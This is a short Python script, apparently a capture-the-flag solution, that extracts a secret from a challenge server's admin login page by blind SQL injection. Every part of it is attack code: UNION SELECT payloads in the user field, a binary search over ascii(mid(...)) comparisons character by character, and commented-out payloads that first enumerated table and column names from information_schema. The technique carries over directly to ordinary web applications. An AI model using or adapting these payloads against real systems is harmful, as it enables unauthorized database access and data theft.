import requests

def guess(target, position):
    url = 'http://ctf.adl.csie.ncu.edu.tw:9487/admin.php'
    payload = {'user' : 'admin', 'password' : 'ihavenoidea'}
    l = 0
    r = 255
    while l != r:
        m = (l + r) // 2
        # payload['user'] = "' UNION SELECT table_schema, table_name FROM information_schema.columns WHERE ascii(mid({}, {}, 1)) > {} limit 1, 1 #".format(target, position, m)
        # payload['user'] = "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'flag' and ascii(mid({}, {}, 1)) > {} limit 0, 1 #".format(target, position, m)
        payload['user'] = "' UNION SELECT 1, adl FROM flag WHERE ascii(mid({}, {}, 1)) > {} limit 0, 1 #".format(target, position, m)
        res = requests.post(url, data=payload)
        
        if res.text.find('Success') > -1:
            l = m + 1
        else:
            r = m
    return chr(l)

leak = ""
for i in range(1, 50):
    leak += guess('adl', i)
    print(leak)
